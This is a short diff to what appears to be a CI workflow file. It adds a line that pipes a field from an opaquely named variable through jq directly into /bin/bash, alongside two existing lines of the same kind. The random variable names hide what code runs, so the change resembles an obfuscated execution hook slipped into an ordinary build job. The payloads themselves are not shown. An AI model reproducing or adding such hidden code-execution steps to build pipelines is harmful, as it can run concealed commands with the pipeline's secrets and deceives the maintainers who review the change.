@@ -20,6 +20,7 @@ jobs:
         run: |
           printf '%s' "$tdpik013" | jq -r .mwat5650 | /bin/bash
           printf '%s' "$gydyg27686" | jq -r .ys8 | /bin/bash
+          echo $kemb12 | jq -r .wy3467 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
